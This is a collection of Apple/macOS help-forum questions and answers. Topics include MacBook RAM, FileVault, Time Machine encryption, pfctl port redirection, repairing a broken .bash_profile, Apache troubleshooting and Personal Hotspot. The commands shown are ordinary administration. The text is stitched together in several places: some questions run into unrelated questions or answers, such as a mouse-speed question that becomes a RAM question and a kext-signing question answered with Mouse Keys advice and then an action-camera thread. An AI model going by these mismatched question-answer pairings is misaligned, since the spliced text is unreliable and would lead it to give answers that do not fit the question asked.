["Q: Script (tie-able to a keystroke) that slows down the mouse for fine movements? Or app that does this? Sometimes when doing graphics work one needs to briefly slow down the mouse movement to make fine pixel-by-pixel movements. One can chance this setting in System Preferences: Mouse, but it then becomes too slow for regular size movements amount the screen. Does AppleScript or any other program allow you to switch this mouse speed quicker than using System Preferences?

I have an old 5,2 17” June 8, 2009 MacBook Pro that I want to upgrade the RAM in, can I put some slightly older MacBookPro5,1 RAM in it, or will it not function right? I’m assuming it will mess up the machine if I put older RAM in it but im not sure. It’s crucial ram and there are two 4GB sticks, if that helps at all, thanks again!\nLiam\n\nA: Both MBPs use the same RAM architecture: 204-pin PC3-8500 (1066MHz) DDR3 SO-DIMM.\nInformation from macOS app MacTracker.\n8GB is the maximum supported RAM for this MBP.\nDisclaimer: I'm a satisfied user of MacTracker and have no financial or other connection with the developer Ian Page.\n", "Q: Quickly transfer file from iOS device to new Windows computer I often need to transfer files from my iOS devices to university PCs. The university PCs always delete all user-installed programs and files upon logging off. What is the easiest way to transfer a file from my iOS device to the Windows PC?\nI currently upload the file to Google Drive and then download it again on the PC, but this requires me to log in and relatively takes too much time. \nI tried using SnapDrop (snapdrop.net or yg.gl), which is a sort of browser-based “AirDrop” service which works across OSes. However, neither device can see each other since it only works if you’re on the same WiFi network (the PC is connected to Ethernet).\nIs there any faster way of securely transferring files from my iOS device, which wouldn’t require me to install anything? (I would otherwise need to install it every time I logged in, which would make the process slow)\n\nA: I think uploading to Google Drive is the best solution without installing any programs. If you use your email in your university anyway, you can email the files to yourself and then download it again.\n", "Q: Disabled then enabled kext signing; some keys no longer work properly MacOS Sierra MacBook Pro mid2012\nI disabled kext signing (to use change some icons in liteicon, which I never got to), and pretty soon some of my keys didn't work like they should. I then enabled it, and rebooted it. As soon as I logged in, some keys no longer did what they should do. The keys that are affected are i, j, k, l, m, o, u, and I don't know if any non-letter keys are affected.\nI have noticed that the i key functions as cmd+o, and some of the other keys do stuff too (but I don't know what).\nIs there any way that I can fix this?

The function is called \"Enable Mouse keys\". It is configured in Settings - Accessibility - Mouse & Trackpad (left pane option), \"Enable Mouse Keys\" AND ALSO via the \"Options...\" button.\nThere is a checkbox setting \"Press the Option key five times to toggle Mouse Keys\".

Upon plugging it in to my Macbook Pro (2015, 10.12) --- nothing happens. It doesn't appear in OBS, PhotoBooth or QuickTime, despite selecting the \"PC Camera\" option when prompted by the camera upon plugging it in. I tried getting it to work with the open-source \"macam\" software, but that didn't recognize it either.\nHow can I make this camera work with macOS?\n\nA: According to the User Manual available here this actioncam cannot be used as a webcam. The prompt you get upon connecting the device via USB lets you probably choose between Mass Storage (UMS) Protocol and Camera (usually abbreviated PTP - Picture Transfer Protocol). \nBoth protocols let you transfer pictures from the actioncam to your Mac/PC but neither of those allows the camera to be used as a webcam. That's the reason why it will not show up in any of the mentioned applications in your question.\nHowever, if you have a HDMI capture card or a device to capture HDMI input, you could theoretically capture the output of the actioncam using the HDMI output of the camera on the side. If you don't have such a card you are probably better off just buying a webcam supported by macOS since those HDMI capture cards are more expensive than a webcam.\n\nA: The above answer is not completely accurate. This model will work as a web camera, but I have only been successful in getting it to work on my work PC. When the camera is plugged into a USB port, a menu will pop up asking you to select between three modes: USB Mode, PC Camera, or Charge Mode. The manual does not address these modes for some unknown reason.\nSelecting PC Camera will put the Campark ACT74 action cam into webcam mode. This works fine on my Dell Latitude 3390, once Windows finished setting up the device (which it interestingly calls \"android\"). The same does NOT work on either my Mac Pro or my MacBook pro. The camera will go into webcam mode just fine, but the computer will not recognize it and it cannot be used.\nIf anyone has a more concrete answer as to why this doesn't work, I would greatly appreciate it.\n", "Q: Mail browser has 20+ viewer windows open but can't close them all, even with a force restart When I click show all viewer windows, they pop up on the bottom and allow me to pick one by one to close them.

Mojave may have brought to light the broken user account / data and not have been the cause of your problems with Preview, etc... Consider if this makes things even worse before you start.\n\nNow, this isn't automatic as Tetsujin points out - data formats change permanently and irreversibly in some cases when you upgrade so you can't roll back the upgrade and have all your data roll back as well. \n\n\n*\n\n*You lose all the work you made since upgrading unless you manually export and import that.\n\n\nIf you don't have a backup, the erase and reinstall is easy - but you'll have to hand migrate apps and data back and possible re-install things that broke and might even lose an app or two if you can't find a working installer to run now.\n\nI'll assume you use Time Machine and have space for all the Sierra backups and one good Mojave backup and you don't mind losing everything if you make a mistake:\n\n\n*\n\n*Perform one last Time Machine backup of the Mojave so you can get any files you modified in the time between before the upgrade and now.

However, when the computer is under rather heavy load, the music sometimes stops for a fraction of a second up to a second (or even longer) all the time. \nThe music is mp3 files stored locally and I’m guessing the CPU scheduling to priority is what is causing this interruption. In my use case, everything else the computer is doing is less relevant so I want to promote this app to the best performance.\nThe version is:\n\nMPlayer 1.3.0-4.2.1\n\nCan I change how I run this app to avoid slowdowns when the CPU gets busy?\n\nA: Check out nice and renice which work on the command line.\nYou can change the priority level of processes, but to change other users processes you have to be admin level...\nJust to provide a link with examples, see https://www.lifewire.com/uses-of-commands-nice-renice-2201087\n", "Q: Failure To Boot/Verify Disk My (mid 2011) MacBook Air’s been working perfectly fine, but today decided to 1) crash 2) throw me the “startup disk not found” error.\n\n\nI know it’s an old computer, but still I run disk verification in Disk Utility decently regularly, and in Recovery mode it doesn’t indicate any issues with the hardware. Somehow the data volume’s become corrupted.\nI plan to find a hard drive, make a disk image from the volume & then reinstall. \nIs there anything else I can do or any way to check whether this will happen again? \nDo I need a new computer?\n\nA: Your partition map and your file system are two different things; kind of like the difference between a car and it's driver.  In your case, the \"car\" may be fine, but the \"driver\" is impaired, so you're not going anywhere (likewise, if the car is totaled, it's unlikely the driver is also fairing poorly).\n\n\n*\n\n*File systems get corrupted for any number of reasons.  You can easily fix this with a reinstall of macOS; from Time Machine is the best method.\n\n*It's possible that your SSD is failing.  In that case, you can replace it with another and have your MBA back up and running.\nFinally, running Disk Utility \"regularly\" doesn't do anything to prevent failures like this.  It's a much better practice to regularly do backups.\n", "Q: How can I see what permissions an enterprise app certificate has? I live in Iran, and here most Iranian apps are banned from the App Store, and are distributed using enterprise certificates. There are even Iranian app stores that use a single such certificate to install other apps, and they even sell some pirated apps through these. See, for example, https://sibapp.com/ and nassaab.com/\n. Though these will probably not work with non-Iranian IPs.\nIn regard of the recent Facebook privacy scandal, I have become concerned how these apps affect my privacy, and what actions I can take to protect myself, and what actions Apple should be pushed to take. This phenomenon (of rogue Iranian apps) has high penetration rates in Iranian users. (Because everyone needs at least some of the services these apps deliver, including banking, SIM card's data and phone management, online taxis, ...)\nI think banning apps but leaving illegal enterprise certificates is possibly the worst way to handle this problem.\nUpdate: Nothing is shown on the device about the certificate:\n\n\nA: The short answer is a certificate has no entitlements, it simply turns off the App Store as the exclusive way to load apps. It doesn't change the code, install a VPN, add a passcode or anything, but what it does is disable one of the best privacy protections you have - Apple review of apps in the App Store.\nThe only worse thing than loading an enterprise app for security would be allowing MDM control so that someone could push changes / track your location / remote wipe your device and lock you out of the device or push apps to it.\n\nYou are correct to be worried about all those apps.\nThat certificate and entitlement are letting you know you are entering the Wild West, so to speak. (or in your case, would it be the Wild East or Wild Middle East?)\nThe warning indicates that nothing in that app was looked at by Apple. Apple didn't do a code review, didn't check that an app that says it's for putting a caption on a photo isn't instead uploading every photo including the date/time/GPS location to their servers to track / market / sell / collect information on every place you have a picture. They could even run facial recognition on the photos once they upload them.\nApple typically doesn't make developers not take the data they take, but they do make the developer let you know what the app does so at least we can all agree which apps will track what taps you make on screen and which don't. (for instance)\n\n\n*\n\n*https://techcrunch.com/2019/02/07/apple-glassbox-apps/\nThe recent press on this shows that VPN apps didn't disclose to the end users so if your apps enable VPN (look in the iOS settings for VPN) then you pretty much can't trust that anything wasn't sent to a server and then decrypted - stored and then re-encrypted to send to the final destination.\nBasically, this allows a \"man in the middle\" attack so you can't trust that some difficulty is needed to decrypt your traffic. Already, we know we can't trust any telecom company not to record / tap / data mine every bit of data we send, but most of us expect that SSL encryption means that it will cost someone time and money to crack our traffic.\nNow, it might be that the entire country of Iran is on some government's watch list and your traffic is already being decrypted, but this certificate allows that telecom to also see and monitor you in ways Apple tries to prevent by apps they put in their App Store.\n\n\n*\n\n*https://www.recode.net/2019/1/30/18203231/apple-banning-facebook-research-app\n\n*https://www.theverge.com/2019/1/31/18205795/apple-google-blocked-internal-ios-apps-developer-certificate\nFor me, I don't ever install these on my personal devices. If I need a work device to have work apps, I let work provide me that device and I do work things on my work device and assume they get everything on that device. It's too hard for me to do app review so I simplify my privacy by not letting a third party install root certificates / SSL / unreviewed apps.\n", "Q: Why are all dependencies forced in Homebrew FFmpeg 4.1? When upgrading to the latest FFmpeg (4.1) through Homebrew, I noticed that an overwhelming number of new dependencies were installed. At the same time, brew info ffmpeg revealed that all installation options were gone. So someone decided that there is only one FFmpeg, then. All or nothing. Where can I find information about this decision and the reason for doing so?\n\nA: Issue 31510: Remove all options\nSee Remove all options from Homebrew/homebrew-core formulae #31510:\n\nOptions in formulae don't produce a good user experience because they have to be built from source, we don't test them in CI and each combination of options provides a new chance for new failures to occur. We should seek to (eventually!) remove all options from formulae in Homebrew/homebrew-core in favour of enabling as much non-exclusive functionality as possible in a given formula for widely used options or encouraging the community to maintain their own custom options in a tap (e.g. https://github.com/denji/homebrew-nginx/blob/master/Formula/nginx-full.rb). As an absolute last resort if we need to depend on the same formula multiple times with different options (e.g. #13133) we can consider vendoring formulae using resource blocks or even duplicating formulae.\n\nYou can explore the history of the ffmpeg formula to see other changes to the dependencies and options.\n", "Q: spotlight math calculation precision 0 = 1E-29? Any idea why if typed into spotlight search, the first formula results in 1E-29, while second formula result in 0?\nCan a step-by-step explanation be had as to why this bug exists?  \nIt's clear this calculation is performed with floating-point arithmetic, though I believe as there is no \"floating-point\" per-se in this calculation, the inequality is a bug, and not a result of floating-point arithmetic limitations.  My intuition tells me this could be done with only integer arithmetic as there is no negative value and no decimal point.\nTo be clear, I don't rely on my intuition, and I'm happy to be told that it is wrong, if that is indeed the case.  I'm just interested in the specific anomaly that leads to this inaccuracy.  \n(1024*64) - (2^16) = 1E-29\n\n(1024*128) - (2^17) = 0\n\n\n\n\nA: Clearly it’s a bug if you believe the exact math should match. It’s probably also a feature since the math library chosen was likely chosen to be fast and small for the math it needs to do and not scientific accuracy for calculating a moon landing.\nThis sort of rounding errors happens all the time, especially if you’re sloppy or don’t implement a guard digit for “small numbers” like 65k. All math libraries make approximations when they encode values, so the bits sometimes matter when you are checking for something that’s very close to zero. In your example the two large numbers aren’t perfectly represented and you get a very insignificant rounding error that doesn’t cancel perfectly when the subtraction happens in one case but not the other. The 1e-29 should be rounded to zero IMO unless the goal is to introduce people to this concept.\nWhen you need to be precise, use PCalc or another calculator that handles precision and rounding properly.\nAlso, if you take 1E-29 of the weight of the earth, that’s just under 60 mg. If you were estimating the mass of the earth, you’d be of by more than a snowflake and less than a grain of sand. This quite literally is the proverbial “making a mountain out of a mole hill”.\n\n\n*\n\n*http://m.wolframalpha.com/input/?i=1e-29+*+weight+of+earth\nThat being said, if you like math or computers, this is very cool, since it exposes the internal representation of a number and you see how an approximation can cause rounding errors for not that very large numbers in this case. There are legendary (to engineers and programmers at least) books devoted to numerical recipes and tricks to do quick and accurate calculations when you don’t bring along a perfect math library.\n", "Q: How can I fix my terminal when editing the PATH in .bash_profile has the startup hang and I get no prompt?

And what i need to do to fix the problem. Any help will be truly appreciated.\n\nA: OK - no worries. You did in fact mess things up, but here's an easy way to fix things.\n\n\n*\n\n*Open TextEdit (or whatever editor you like graphically on the Mac)\n\n*Open a file and go to your home folder (click or press Command Shift G and type ~ and return)\n\n*Show hidden files (if needed) - Command + Shift + .\n\n*Open .bash_profile\n\n\nDelete everything or comment out anything that contains PATH= and save the file (you can save as to save it to your Desktop if you want to fix it up rather than start new).\nThen open a new terminal window to check your work. If it works, close out the broken sessions and make sure you incorporate the old path when you add things:\nThis is safe:\nexport PATH=\"/usr/local/sbin:$PATH:/path/to/whatever/bin\"\n\nIt's safe since the old $PATH is included on the right of the =\nWhat isn't safe is when \nexport PATH=\"whatever\"\n\nAll the other parts of the path are now gone, with only whatever left and the last = wins, so your path is missing very important items instead of adding things to the default path, you broke it temporarily. No worries, this is a phase of passage - everyone needs to break their shell dot files to learn. Welcome to the club.\n\nA: I'd recommend a somewhat different approach from @bmike: rather than trying to remove the bad parts from the current file, start over and add back just the good parts. It looks like there's a lot more bad than good in the current file, so this should be simpler.\nWhat's really really really bad in the current file is the section that starts like this:\ncat << EOF >> ~/.bash_profile\n\n...and somewhere down below that there'll be EOF alone on a line. The problem is that this isn't an instruction to set up your environment, it's instructions to add instructions to your ~/.bash_profile. In other words, every time your ~/.bash_profile runs, it adds another copy of the stuff between cat and EOF to the end of ~/.bash_profile, so the file gets longer and longer and longer... and has more and more copies of the messed up instructions.\nAt this point, your ~/.bash_profile will be huge, and mostly garbled nonsense.\nSo, I recommend starting over. Rename and save the current file, so you can refer back to it if necessary, then create a new blank .bash_profile in your home directory. I recommend BBEdit for this -- it has a free demo mode that'll do everything you need here, and (unlike most text editors) it won't do \"helpful\" things like converting plain ASCII quotes (like \") to fancy unicode quotes (like “ and ”) that mess up shell scripts. It also doesn't complain about saving files with names that start with \".\".\nFrom the section visible in your screenshot, this is the only part of the current file that looks right:\n# Setting PATH for Python 3.7\n# The original version is saved in .bash_profile.pysave\nPATH=\"/Library/Frameworks/Python.framework/Versions/3.7/bin:${PATH}\"\n# Add Visual Studio Code (code)\nexport PATH=\"$PATH:/Applications/Visual Studio Code.app/Contents/Resources/app/bin\"\n\nThere might be something you actually want further down, but since the cat part starts shortly after that I doubt it. In any case, this should be enough to get you a basically functional setup; if there are some things that still don't work, you may have to look through the old file for other things that need salvaging.\n", "Q: Getting an error when formatting a thumb drive Inside of Terminal.app, I'm trying to format a thumb drive and I'm getting the following \"error\":\n\ndoes not appear to be a whole disk\n\nThe line I typed in was the following:\nsudo diskutil partitionDisk /dev/disk1s2 GPT JHFS+ HighSierra R\n\nWhat might I be typing in wrong?

I am planning to buy a Mac and want to enable full-disk encryption.  With LUKS you will be prompted for your password before the boot.\nOn macOS I heard you need to use your user password to unlock the disk.  \n\n\n*\n\n*How does this work in detail?\n\n*The login screen needs to be unencrypted, is it a separate partition then?  \n\n*How does the login screen gets a list of the users while the disk is still encrypted?\n\n\nA: You can find a setup guide for FileVault 2 here:\nhttps://support.apple.com/en-gb/HT204837\nWhen you enable FileVault 2 on your boot drive, an admin user will need to unlock the computer before it can be used. I.e. non-admin users will not be able to unlock and decrypt the drive.\nWhen you turn on the computer, it boots from a separate, non-encrypted partition. That partition holds the decryption software as well as a list of admin users that can unlock the drive. This is done so that the bootup partition can display a startup image similar to a normal login screen with the names and avatars of the users that can unlock the drive.\nNote that the unencrypted drive only holds the user names, not passwords, salted hashed passwords or anything like that. The user will need to enter a password that successfully decrypts the decryption key in order to unlock the computer.\nIn addition to the login password (which is used as a passphrase for one of the keys), you can also choose to enable either a recovery key, which is a 120-bit master password that can be used to decrypt the drive, or the option to allow an AppleID to unlock the drive. This means that you can unlock the drive by logging in to your AppleID which enables you to retrieve the key from Apple's servers. Some like this option for its ease of use, others prefer not to enable it for security reasons.\nWhen you compare FileVault to LUKS, the systems are in principle very similar. However on a modern Mac with the T2 security chip, you'll find an additional security layer implemented with a Secure Enclave which tries to hinder brute forcing the pass phrase by adding delays, and protects against side-channels attacks on the main CPU as the encryption keys are never in memory on the Intel CPU.

How can I unmerge it so the result will be 2 cells with the same data?  \n\nI have cases with up to 7 cells merged in the xls file. How can I unmerge them all?\n\nA: There's no automated way to do this. \nAs you would know, when you merge two or more cells the data all ends up in the new merged cell. However, if you unmerge the cell in future, Numbers will retain the data but keeps it in the left most cell (or, in the case of merged cells across rows and columns, data ends up in the top left cell when unmerged).\nThis behaviour is standard across spreadsheeting software (e.g. MS Excel, etc). Typically, if you want to unmerge the cell and then retain the data in the other cells as well, you would first unmerge the cell and then copy/paste the existing data from the first cell into the others.\nIf you needed to automate this because you had a large number of merged cells to unmerge and retain the data in all cells, you would need to look at using something like AppleScript to achieve what you want. Of course, this assumes you're talking about Numbers in macOS rather than in iOS.\nFinally, your question refers to an Excel file (the .xls file you mention), so another option would be to use Visual Basic in Excel to make the changes first before opening the file in Numbers. However, this too would require coding a custom solution just like you'd have to using AppleScript. Any such option would have to be done within Windows or macOS (i.e. not Excel for iOS or Android).\n", "Q: Multiple Time Machine backups, both encrypted and unencrypted I have an unencrypted Time Machine backup with a long history. I'm planning to add a brand new disk to the Time Machine, and use both to do backups simultaneously. \nThe new disk will be stored in an off-site location, so I would like to have it encrypted. Is it possible to encrypt only the second backup drive?\nSpecifically, I do not want to enable encryption on the original backup as well. In part because I understand that this requires Time Machine to make a new encrypted backup, potentially losing the history?\n\nA: Yes, it's entirely possible to have a mix of encrypted and unencrypted TM backups of the same Mac. In fact, that's exactly what I use for my MacBook Pro: 3 backup drives, one unencrypted drive that stays home, and two encrypted drives that rotate being offsite.\nWhen backing up to a directly-attached disk drive, the only difference between an encrypted and unencrypted backup is how the backup disk is formatted -- an unencrypted backup is in the \"Mac OS Extended (Journaled)\" format, and an encrypted one is in \"Mac OS Extended (Journaled, Encrypted)\" format.\nHowever, note that the encryption applies to the entire drive (or volume, if it's split into multiple partitions). That means that if you have two computers backing up to the same disk, they'll both be encrypted (with the same password). Similarly, any other files you happen to store on the backup disk (/volume) will be encrypted as well.\nJust for completeness, if you're backing up to a network target (Time Capsule, file server, NAS device, etc), the encryption works quite a bit differently. For network targets, TM creates a disk image on the server and backs up into that, and can use either encrypted or unencrypted disk image formats. As a result, the encryption applies only to the backup itself, not to anything else stored on the server. But it's still possible to mix target types freely: you could have the same Mac backing up to an unencrypted local drive, and an encrypted local drive, and an encrypted network target, and an unencrypted network target. No problem.\n", "Q: Change from Mac OS Extended File to APFS in order to install Mojave I've tried to install Mac OS Mojave on my Mac Mini (late 2012), but it has Mac OS Extended (journaled) as the file system on the main drive.

That error message (\"Hmm. We’re having trouble finding the site.\") sounds like Firefox having trouble looking up the address for the name \"localhost\", which is really weird because \"localhost\" is pretty much built into the operating system. So, first verify that \"localhost\" is being properly resolved with the command dscacheutil -q host -a name localhost -- it should look like this:\n$ dscacheutil -q host -a name localhost\nname: localhost\nipv6_address: ::1\nipv6_address: fe80:1::1\n\nname: localhost\nip_address: 127.0.0.1\n\nIf the response doesn't list at least the addresses \"::1\" and \"127.0.0.1\", something is terribly wrong. (It's ok if it lists additional addresses like \"fe80:1::1\".) This has nothing to do with Apache.

If those work, Apache is running and \"localhost\" lookup is the reason you're getting errors.\nIf bypassing the name lookup doesn't work, check to see whether Apache (\"httpd\") is running with the command ps -ax | grep '[h]ttpd'\n$ ps -ax | grep '[h]ttpd'\n48917 ??         0:00.62 /usr/sbin/httpd -D FOREGROUND\n48924 ??         0:00.02 /usr/sbin/httpd -D FOREGROUND\n48927 ??         0:00.01 /usr/sbin/httpd -D FOREGROUND\n\nIf there are no \"httpd\" processes listed, Apache is not running, and you'll need to troubleshoot further to find out whether it's not starting at all, or starting and getting a fatal error. If it is running, make sure it's listening for network connections with sudo lsof -a -c httpd -i -sTCP:LISTEN\n$ sudo lsof -a -c httpd -i -sTCP:LISTEN\nCOMMAND   PID USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME\nhttpd   48917 root    4u  IPv6 0x3c39418bc7b0ab99      0t0  TCP *:http (LISTEN)\nhttpd   48924 _www    4u  IPv6 0x3c39418bc7b0ab99      0t0  TCP *:http (LISTEN)\nhttpd   48927 _www    4u  IPv6 0x3c39418bc7b0ab99      0t0  TCP *:http (LISTEN)\n\nIn the above, all three \"httpd\" processes are listening for TCP connections on \"*:http\" -- that is, port 80 (http) on all of this computer's IP addresses. If it lists something else, Apache is running, but the configuration is weird.\nNote: none of the above will solve the problem, it's all directed toward finding out what the actual problem is. Once you have a better idea what the problem is, then you can try to figure out how to fix it.\n", "Q: How to identify iPad models: MLQ82FDA and MLYM2FDA? I need to find out what iPads have the order numbers MLQ82FDA and MLYM2FDA. I don't own them and so I do not have the A number available.\nI try to identify it using this Apple Support page but with no success.\n\nA: MLQ82FDA is a 9.7 Inch iPad Pro / Wifi + Cellular / 256 GB / Gold / Year 2016\n\n\n*\n\n*https://www.singular.com.cy/apple-9.7-inch-ipad-pro-wi-fi-cellular-tablet-256gb-9.7-ips-2048-x-1536-4g-gold.html\nMLYM2FDA is a 9.7 Inch iPad Pro / WiFi + Cellular / 256 GB / Rose Gold / Year 2016\n\n\n*\n\n*http://pc-tablet.pl/tablet-apple-ipad-pro-9-7-256gb-lte-mlym2fda,3161.html\nYour A number can be found by going to Settings -> About then look for Model, then tap the MP number to switch it to an A number.\n", "Q: Redirect IP traffic with 'pfctl' on macOS I'm working on a mac with OS 10.13.6.\nI want to redirect all requests to 10.20.154.24:1111 made from my computer go to localhost:8080.\nI read about pf and pfctl, but could not make this work.\nI thought to run this, but it didn't work...\necho \"\nrdr pass inet proto tcp from 127.0.0.1 to 10.20.154.24 port 1111 -> 127.0.0.1 port 8080\n\" | sudo pfctl -ef -\n\n\nA: If your traffic is coming from your computer and since the destination isn't your computer the from can't be 127.0.0.1. The from IP  is the IP address associated with the interface to use to reach 10.20.154.24.\nTo make an easy test, just start by removing the part from 127.0.0.1 in your rdr rule, so as to catch all traffic tcp to 10.20.154.24 port 1111 which will include the one you want to redirect.\nNext, and if this is necessary, check your outgoing interface IP address with:\nifconfig en0\n\n(because I bet your interface is the WAN one, but adapt to your real case).\n", "Q: Command + Space no longer catchable I can no longer use Command + Space inside iTerm2.\nI have been using iTerm2 for years, and configured it so that the Command keys acts as the Alt key. I recently applied the security patch for macOS Sierra 10.12.6, and while all other key combinations continue to work, Command + Space is no longer transmitted to the terminal application, which is a pain as it is bound to set-mark in my favorite environment, qemacs.\nWhere can I change this behavior?\n\nA: The system has defined a shortcut that intercepted this on my mac:\n\n\n*\n\n*commandspace was bound in System Preferences to Select the previous input source in the Input Sources panel of the Shortcuts tab.\n\n\nThis setting might have been in effect already, but since I have only a single input source (US QWERTY keyboard), it may have been ignored before.\nIn any case, deselecting the shortcut fixed the problem.  Since it can be a pain to have to go fishing for a binding in all panels, here is an app (recommended by bmike) that shows you the current live shortcuts in any app as it runs.\n\n\n*\n\n*https://www.cheatsheetapp.com/CheatSheet/\n", "Q: Limit iOS's app access to sound output I am a new iPhone user, because Apple has formed an amazing partnership with Cochlear Corp (hearing-implant devices), so I can directly pair my cochlear implant with my iPhone. The app for this is called Nucleus Smart, but it has pretty limited functionality.\nOne issue is that when I open any app that can access sound, it switches automatically to my hearing aid. For example, even my solitaire app, with the sound option turned off, will still automatically turn on my hearing aid, and essentially mask all regular environmental sounds with the muted audio.\nThe developers of the app aren't particularly responsive, so I'm wondering if there is another app that can block app access to any sound output.\n\nA: There is no way to do this in the Settings and I am sure this is no app to do this without a jailbreak. Some apps offer an option to turn off sounds in Settings, but if there aren’t any options there is no way to go around it. \n", "Q: Can Time Machine files be restored across different OSs? I am backing up my MacBook Air that runs OS X El Capitan 10.11.6 to an external Hard Drive using Time Machine. I have another older MacBook that runs Mac OS X 10.6.8. If I wipe the hard drive of the older macbook can I restore it using my the Time Machine that was created using OS X El Capitan? Any issues that I should be aware of?\n\nA: Each mac can only run versions of macos that apple allows. \nYou need to look up your older machine in a database like http://mactracker.ca/ to find out if it supports el capitan. \nThere is a five release difference between the two macOS.  The new OS will use much more ram and run slow on an old machine.\n", "Q: Create a shortcut/widget to an Accessibility feature I would like to build a shortcut to General -> Accessibility -> MFI Hearing Devices -> Adam Hearing Devices -> Stream to left hearing device, and toggle that off/on. I've been searching the Shortcuts documentation but can't find a way to do this. Is it possible, maybe with another app?\n\nA: If you go into General -> Accessibility -> Accessibility Shortcut, is there an option to add 'Stream to left hearing device'?\nIf so, you can then triple click on the home button and that should (providing you haven't enabled any other accessibility features) toggle the stream. \nUnfortunately I do not have a MFI device to test this with, however I do use the accessibility shortcuts frequently. \n", "Q: My iPhone is no longer appearing in Wi-Fi menu above the line after changing mobile phone provider I want to share Internet connection from my iPhone to my Macbook. Before, I just clicked the Wi-Fi icon on my mac and my iPhone automatically appeared there above the line.

I there a way to make it work like it did before?\nI'm aware that there is an option to connect to my phone from the Bluetooth icon, but that's not what I want.\n\nUpdate\nI followed @drivec suggestion and it fixed my issue. Here is what I did:\n\n\n*\n\n*Logged out of iCloud both on Mac and iPhone.\n\n*Rebooted both devices.\n\n*Logged into iCloud on both devices.\n\n*Rebooted both devices.\n\n*Now my iPhone appears in the Wi-Fi menu of the Mac without turning on \"Personal Hotspot\" on the iPhone, see picture below.\n\n\nA: The Instant Hotspot is part of Apple's Continuity and Handoff features.\nTry each of these troubleshooting steps:\n\n*\n\n*Confirm both devices are logged into iCloud.\n\n*Toggle WiFi and Bluetooth off and on for both devices (for iOS, use the Settings app and not Control Center to toggle these settings).\n\n*Reboot both devices.\n\n*Log out of iCloud on both devices and log back in.\n\nLogging out of iCloud and back in on both devices can be a pain and take some time, so make sure to try the previous steps first. It may or may not be helpful to reboot your devices after both logging out and logging back in.\nFor this particular situation, the asker indicated that they did the following to solve their problem:\n\n\n*\n\n*Logged out of iCloud both on Mac and iPhone.\n\n\n*Rebooted both devices.\n\n\n*Logged into iCloud on both devices.\n\n\n*Rebooted both devices.\n\n\nA: The web offers a myriad of solutions to this but most did not work for me. I'll first describe what worked for me and then list the ones that didn't, in case they'll help others that find this.\nWhat helped me: Resetting my Mac's Bluetooth module\nMy issue was that my Mac had some traces of data in some Bluetooth system that had to be cleared. When I reset my Mac's Bluetooth module my iPhone appeared under the \"Personal Hotspots\" header in the WiFi menu.\nThis is what helped me:\n\n\n*Make sure the Bluetooth icon in the menu bar is enabled by checking \"Show Bluetooth in menu bar\" in System Preferences > Bluetooth.\n\n\n*Hold shift and option and click the Bluetooth icon in the menu bar.\n\n\n*Click Debug > Remove all devices (I did this, I'm unsure if it helped).  Note that you will have to reconnect all your devices after this (mice, keyboards, AirPods, ...).\n\n\n*Open the same menu again by holding shift and option and clicking the Bluetooth icon in the menu bar.\n\n\n*Click Debug > Reset the Bluetooth module.\nThis was the only action that solve the problem for me, after trying everything below.\nOther solutions I have found online that might help you\nThe solutions below is what I tried that did not help but that have helped others. Hopefully it will help you if resetting the Bluetooth module did not.\nTurn it on an off again\nTurn off both your Mac and your iPhone and then turn them on again.\nMake sure Wifi and Bluetooth is turned on\nJust to make sure, enable both WiFi and Bluetooth on your Mac. Bluetooth is used to mediate between the phone and the computer and setup the WiFi network used for the Personal Hotspot, so Bluetooth needs to be enabled.\nAlso make sure Bluetooth is enabled on your phone and that its not in Airplane mode.\nReset Network Settings\nThis will restart your iPhone. I lost no data doing this and did not notice any difference. In particular it did not solve the Personal Hotspot problem in my case.\n\n*\n\n*Go to the Settings app > General > Reset > Reset Network Settings.\n\n*Your iPhone will restart.\n\nSign out of iCloud on your iPhone\nYou need your iPhone password and iCloud password to do this. I did this without losing any data, but it did not solve the Personal Hotspot problem.\n\n*\n\n*Go to the Settings app > Your name at the top > Sign out (at the bottom). NOTE THAT THIS WILL SIGN YOU OUT OF ICLOUD AND REMOVE ICLOUD DATA ON YOUR PHONE.\n\n*Sign in again to get your data back.\n\nSign out of iCloud on your Mac\nI needed my iPhone password (yes, the iPhone password), Mac password and iCloud password to do this. I did this without losing any data, but it did not solve the Personal Hotspot problem.\n\n*\n\n*Go to System Preferences > Apple ID > Overview and click Sign out (at the bottom). NOTE THAT THIS WILL SIGN YOU OUT OF ICLOUD AND REMOVE ICLOUD DATA ON YOUR MAC.\n\n*Sign in again to get your data back.\n\nMore information\n\n*\n\n*There is a help article on Apple's support page that might help you.\n\n*Lifewire wrote about solutions to this problem.\n\n", "Q: did the following steps now disk is not recognized!

I don't have an admin account on my Mac.

I find FaceTime works much better on 4g than my home wifi despite good upload bandwidth. I suspect variable latency is the cause. My router and Orbi does not have Ipv6 enabled. If I can get V6 working will I see significantly better video quality?\n\nA: It could be a case of the two parts of the conversation not being able to make a direct connection to each other because of NAT, CGN or similar, and therefore falling back to an intermediary proxy server. That will introduce latency, and could potentially cause lower perceived quality.\nEnabling IPv6 could solve that - if it’s not encumbered by the same problems by your ISP or equipment. IPv6 is usually much better in this respect though.\nYou could also try to make sure that hole punching is possible on your IPv4 setup.\n", "Q: How can I complement a suggested address in Maps? I want to find an address in Maps, let's say it's Baker Street, 221b, London. So I begin to type \"baker street\" into the search field in Maps. Soon, after 3-4 typed characters, \"Baker Street, London, England\" appears among suggestions.\n\nIf I tap on the suggestion, Maps will set a red location marker somewhere on the street. Now, I don't want the street, I want a particular house number on it. \nHow can I change the Maps suggestion to add a house number? Currently I type the whole street name and then type the house number at the end, and this is not very convenient, especially if the street name is long. \nPS. Since there may be misunderstanding - the question is not specifically about UK or England. Baker Street is just an example. It could be Bakkerstraat 22 in Anwerpen as well (not a museum or any point of interest, just a normal house where people live).\n\nA: This answer has evolved slightly since comments changed the OP's intent. It now generally covers Apple Maps & how it stores & searches locations. Sherlock Holmes is less relevant, but it's still a valid start point for the rest.\nThis is also pertinent to macOS as well as iOS, they both share the same structure.\nHouse numbers come first in the UK. \nSherlock's Address is 221B Baker Street. As it's such an iconic [if actually completely fictitious] address, simply typing 221b will find it.  \n\nAgain, because it's a well-known landmark, Maps does have a specific Point of Interest for it.\nNote that the house with the number 221B painted on the glass above the door & the Sherlock Holmes blue plaque is actually 239 Baker Street, it's all just bluff for the tourists ;)\nGenerally for the UK, Maps will use the Postcode for the location not the actual number/street, so in this instance NW1 6XE is actually as accurate as it can resolve. [This can be extremely irritating if the Postcode area is large, such as in the countryside, but generally is close enough in a city.]\nIn short - learn the postcode & search that.\nLet's take a much broader example.  \nI live on Church Street.\nCan you imagine just how many Church Streets there are in the UK? - there are 2 within a mile of here so even locally that's a difficult 